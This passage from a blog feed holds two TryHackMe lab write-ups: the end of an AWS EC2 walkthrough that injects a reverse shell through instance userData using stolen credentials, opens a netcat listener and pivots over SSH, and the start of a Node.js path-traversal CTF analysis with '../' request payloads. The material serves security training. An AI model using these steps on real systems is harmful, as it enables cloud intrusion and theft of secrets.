&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Remember to replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;AttackBoxPublicIp&amp;gt;&lt;/code&gt; with your machine’s public IP address. Also note that this payload will target port 4444. If needed or desired, you can replace this with another port, but remember to use the same one for the listener.&lt;/p&gt;

&lt;p&gt;Save it as &lt;em&gt;reverse-shell-native.txt&lt;/em&gt;. Next, base64-encode the file. Since OpenSSL is available on &lt;em&gt;many&lt;/em&gt; platforms, we can use that to encode its contents:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ openssl base64 -in reverse-shell-native.txt -out reverse-shell-native.enc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In addition, go ahead and start the listener in the AttackBox shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nc -lvp 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we need to upload the contents to one of the instances. From trial-and-error, I can confirm that a rever shell connection will fail if coming from the &lt;em&gt;SecretDataInstance&lt;/em&gt;. There’s lots of reasons why reverse shells might fail—for example, firewall rules or EDR software—but you should never make assumptions. If this had worked, we would have circumvented the Application instance altogether.&lt;/p&gt;

&lt;p&gt;Instead, we can defer to the attack workflow provided in the lab briefing: setting up the reverse shell from the &lt;em&gt;ApplicationInstance&lt;/em&gt;, and from there, using a password-based &lt;em&gt;ssh&lt;/em&gt; to the &lt;em&gt;SecretDataInstance&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;First, revert the original &lt;em&gt;userData&lt;/em&gt; on the secret instance. Ensure that the AttackBox is running the Netcat listener. Then, stop the &lt;em&gt;ApplicationInstance&lt;/em&gt;, update the &lt;em&gt;userData&lt;/em&gt; attribute with the same ASCII-encoded reverse shell payload, and start the instance again, using the &lt;em&gt;ApplicationInstance&lt;/em&gt; ID.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 start-instances \
    --instance-id i-... \
    --profile ec2-stolen
    # Wait...

~$ aws ec2 modify-instance-attribute \
    --profile ec2-stolen \
    --instance-id i-... \
    --attribute userData \
    --value file://reverse-shell-native.enc
    # Note: If successful, nothing will print.

~$ aws ec2 start-instances \
    --instance-id i-... \
    --profile ec2-stolen
    # Wait a little longer...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that stopping and starting can both take a few minutes, so grab a cup of coffee. You can check on the status with the &lt;em&gt;ec2:DescribeInstanceStatus&lt;/em&gt; API call:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instance-status \
    --profile ec2-stolen 
    --instance-ids i-...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In any case, once successful, the &lt;em&gt;nc&lt;/em&gt; listener will receive the connection. You are now connected to the &lt;em&gt;ApplicationInstance&lt;/em&gt; box. The next step is to use &lt;em&gt;ssh&lt;/em&gt; to pivot into the &lt;em&gt;SecretDataInstance&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;At this point, I would strongly recommend running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -i&lt;/code&gt; or run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/code&gt;. If not, you won’t see the SSH prompts, and this may interfere with the login process.&lt;/p&gt;

&lt;p&gt;Once you’re ready, use:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ ssh &amp;lt;User&amp;gt;@&amp;lt;PrivateIp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Where:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;User&lt;/em&gt; is the username you exfiltrated from the Secret instance’s &lt;em&gt;userData&lt;/em&gt; configuration&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;PrivateIp&lt;/em&gt; is the Secret instance’s &lt;em&gt;PrivateIpAddress&lt;/em&gt; we got earlier&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Once it prompts you for the password, use the password exfiltrated from the &lt;em&gt;userData&lt;/em&gt;. At this point, you can run some familiar Linux commands to dump the contents of the secret.&lt;/p&gt;

&lt;p&gt;As a final note, the &lt;em&gt;nc&lt;/em&gt; package is preinstalled on the Secret instance. You can use it to try and manually initiate a reverse shell outside of the NAT and try to get a connection from a public workstation or the THM AttackBox. I didn’t have much success there, but it may be worth exploring further if you have the time.&lt;/p&gt;</content><author><name></name></author><summary type="html">THM EC2 Capstone Walkthrough</summary></entry><entry><title type="html">TryHackMe DevSecOps CTF walkthrough</title><link href="http://localhost:4000/2024/02/18/thm-dso-walkthrough.html" rel="alternate" type="text/html" title="TryHackMe DevSecOps CTF walkthrough" /><published>2024-02-18T00:00:00-05:00</published><updated>2024-02-18T00:00:00-05:00</updated><id>http://localhost:4000/2024/02/18/thm-dso-walkthrough</id><content type="html" xml:base="http://localhost:4000/2024/02/18/thm-dso-walkthrough.html">&lt;h1 id=&quot;overview-of-mothers-secrets&quot;&gt;Overview of “Mother’s Secrets”&lt;/h1&gt;

&lt;p&gt;“Mother’s secrets” is a web pentest challenge. It is an unguided challenge and therefore resembles a “real” CTF. This writeup covers my own methodology, not just for finding the flags, but for testing the system as though this were a real-world engagement.&lt;/p&gt;

&lt;p&gt;Much of the content is redacted or not included, as that would take the fun out of doing the challenge yourself. You are encouraged to use this as a guide to develop your own approach, not as a cheat-sheet for the answers. (Incidentally, as you will see later, you can find all of the referenced file content online, available to the public, even without a THM subscription.)&lt;/p&gt;

&lt;p&gt;Also, shoutout to the &lt;em&gt;Alien&lt;/em&gt; theme and references.&lt;/p&gt;

&lt;p&gt;Without even reading the challenge description, keep in mind that this is a &lt;em&gt;DevSecOps&lt;/em&gt; exercise. As you build a threat model of this application, keep in mind the attack surface:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Secrets management (or lack thereof)&lt;/li&gt;
  &lt;li&gt;Source-code management&lt;/li&gt;
  &lt;li&gt;Build and deploy configuration&lt;/li&gt;
  &lt;li&gt;System environment configuration&lt;/li&gt;
  &lt;li&gt;Application stack and configuration&lt;/li&gt;
  &lt;li&gt;Insecure coding practices&lt;/li&gt;
  &lt;li&gt;Identity and Access Management&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Right off the bat, the last two will stand out in the “task files,” which represent either a gray-box assessment, or an instance of leaked source code.&lt;/p&gt;

&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;

&lt;p&gt;First, download the “task files.” This is a single, flat file which contains code for two routes: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yaml.js&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nostromo.js&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;First, inspect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yaml.js&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;em&gt;isYaml&lt;/em&gt; arrow function only performs validation on the suffix of a given filename (ends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt;). In the real world, this would not be considered a “robust” solution for file validation. However, we will see later that this is a non-issue for our goals as an attacker.&lt;/li&gt;
  &lt;li&gt;The route at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; accepts a POST request with a JSON object containing a property called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_path&lt;/code&gt;. It validates whether the file ends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt; and then validates whether the file exists. In short, if you provide a real YAML file path, the contents of that file are returned.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_path&lt;/code&gt; string is unsafely inserted into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./public/${file_path}&lt;/code&gt;. This can enable path traversal by the time it reaches the call to &lt;em&gt;fs.readFile&lt;/em&gt;. Informationally, take note that this will target a folder called &lt;em&gt;public/&lt;/em&gt; which exists in the same directory as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yaml.js&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Note that &lt;em&gt;fs.readFile&lt;/em&gt; will return the contents of a file only. It will not return a directory listing. If the file does not exist, it will raise the error condition in the callback.&lt;/li&gt;
  &lt;li&gt;Finally, there is an interesting import of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../websocket.js&lt;/code&gt;. The business logic here seems trivial, but the import itself is of interest.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, inspect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nostromo.js&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The POST-based &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; route is nearly identical in behavior to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; route seen earlier; this includes the path-traversal vulnerability. There are two major differences, however: no filename validation, and logic that sets the global &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isNostromoAuthenticate&lt;/code&gt; variable to &lt;em&gt;true&lt;/em&gt;. In short, if you give this route the path to &lt;em&gt;any&lt;/em&gt; file that exists, it will return the contents of that file unconditionally.&lt;/li&gt;
  &lt;li&gt;Likewise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo/mother&lt;/code&gt; POST route is nearly identical to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; route, but with two major differences. The first is that, in order to return the contents, two global variables must be &lt;em&gt;true&lt;/em&gt;: &lt;em&gt;isNostromoAuthenticate&lt;/em&gt; and &lt;em&gt;isYamlAuthenticate&lt;/em&gt;. (The task file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yaml.js&lt;/code&gt; does not include logic for &lt;em&gt;isYamlAuthenticate&lt;/em&gt;, so it’s possible that some or all of the source code is outdated.) The second major difference is that it reads files from a path called &lt;em&gt;mother/&lt;/em&gt;, which is important to note as we build an understanding of the underlying structure.&lt;/li&gt;
  &lt;li&gt;This imports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./yaml.js&lt;/code&gt; from the same directory. In the application, we could expect both files to exist in the same place, although it is not yet clear what the folder is named.&lt;/li&gt;
  &lt;li&gt;This also imports code from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../websocket.js&lt;/code&gt;. Note that, in both routes’ code, this exists one directory up.&lt;/li&gt;
  &lt;li&gt;Finally, the commented-out import statement implies a folder at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../../mothers_secret_challenge&lt;/code&gt;, which contains a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../websocket.js&lt;/code&gt;. If you follow the relative paths, you’ll notice that this could be the name of the project folder, as the location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocket.js&lt;/code&gt; matches with this path.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on static analysis, we can infer the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The project is likely based on NodeJS.&lt;/li&gt;
  &lt;li&gt;A rough outline of the project structure is evident.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; route is the easiest to attack in order to achieve path traversal, and may prove the most valuable.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; route can be exploited only if we know the location of a YAML file on the system.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo/mother&lt;/code&gt; route can be exploited only after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; are successfully executed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We also have a rough idea of the project structure:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mothers_secret_challenge/
- websocket.js
- &amp;lt;folder&amp;gt;/
	- yaml.js
	- nostromo.js
	- public/
	- mother/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And some relevant technologies:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/js-yaml&quot;&gt;js-yaml&lt;/a&gt;: Using &lt;em&gt;yaml.load&lt;/em&gt; to load a &lt;a href=&quot;https://snyk.io/advisor/npm-package/js-yaml/functions/js-yaml.load&quot;&gt;YAML file&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/express&quot;&gt;express&lt;/a&gt;: Using &lt;em&gt;Router.post&lt;/em&gt; for &lt;a href=&quot;https://expressjs.com/en/guide/routing.html&quot;&gt;POST-based routes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nodejs.org/api/fs.html&quot;&gt;fs&lt;/a&gt;: Using &lt;em&gt;fs.readFile&lt;/em&gt; to &lt;a href=&quot;https://nodejs.org/dist/latest-v6.x/docs/api/fs.html#fs_fs_readfile_file_options_callback&quot;&gt;read the contents of any file&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With this in mind, let’s visit the site at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://IP_ADDRESS&lt;/code&gt;. The home page is a single HTML file, which imports some JS files. Informationally, we will note the presence of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.min.js&lt;/code&gt;, but will safe static analysis for later because minified JS is a pain to read.&lt;/p&gt;

&lt;p&gt;Aside from that, the frontend functionality is pretty limited. You can use the UP and DOWN arrows on your keyboard to navigate to different text panels. At this stage, the content does not reveal much, so we can save this for later.&lt;/p&gt;

&lt;p&gt;Let’s try to understand the API. The frontend does not reveal anything about where the routes exist, so you will need to test the route names with some &lt;a href=&quot;https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d&quot;&gt;common API naming conventions&lt;/a&gt;. In this case, here are the locations:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://IP_ADDRESS/yaml&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://IP_ADDRESS/api/nostromo&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://IP_ADDRESS/api/nostromo/mother&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Make sure you are using POST requests to access these. Otherwise, you will get a generic message about the “wrong route.”&lt;/p&gt;

&lt;p&gt;Earlier, we determined that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; is the most exploitable route. First, try to exploit the Path Traversal vulnerability identified during static analysis. Let’s try to fetch the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../nostromo.js&lt;/code&gt; because we know where this file lives: one directory above the &lt;em&gt;public/&lt;/em&gt; folder:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /nostromo HTTP/1.1
Host: http://IP_ADDRESS
Content-Type: application/json
...

{
  &quot;file_path&quot;: &quot;../nostromo.js&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The contents of this file, which we observed from the task file, is returned. We can infer two things here: that path traversal is achievable, and that file contents are returned as-is.&lt;/p&gt;

&lt;p&gt;Next, let’s also see if some common NodeJS artifacts exist. Try to return the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;package.json&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /nostromo HTTP/1.1
Host: http://IP_ADDRESS
Content-Type: application/json
...

{
  &quot;file_path&quot;: &quot;../package.json&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This returns the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
  &quot;name&quot;: &quot;mother-secret&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;&quot;,
  &quot;main&quot;: &quot;server.js&quot;,
  &quot;type&quot;: &quot;module&quot;,
  &quot;scripts&quot;: {
    &quot;start&quot;: &quot;node server.js&quot;,
    &quot;dev&quot;: &quot;nodemon server.js&quot;
  },
  &quot;author&quot;: &quot;&quot;,
  &quot;license&quot;: &quot;ISC&quot;,
  &quot;dependencies&quot;: {
    &quot;compression&quot;: &quot;^1.7.4&quot;,
    &quot;express&quot;: &quot;^4.18.2&quot;,
    &quot;js-yaml&quot;: &quot;^4.1.0&quot;,
    &quot;nodemon&quot;: &quot;^2.0.22&quot;,
    &quot;socket.io&quot;: &quot;^4.7.0&quot;
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The contents confirm that the project is in fact NodeJS based. We can also see the imports from the task files in this package structure.&lt;/p&gt;

&lt;p&gt;Based on the &lt;em&gt;scripts&lt;/em&gt;, it looks like the main logic lives in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.js&lt;/code&gt;. Let’s inspect that file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /nostromo HTTP/1.1
Host: http://IP_ADDRESS
Content-Type: application/json
...

{
  &quot;file_path&quot;: &quot;../server.json&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The contents:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fileURLToPath&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;compression&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;compression&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// import {routeNostromo} from &quot;./routes/nostromo.js&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;routeNostromo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;./routes/nostromo.js&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;routeYaml&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;./routes/yaml.js&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;attachWebSocket&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;./websocket.js&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fileURLToPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;meta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/public/`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10kb&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;compression&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// route middleware&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
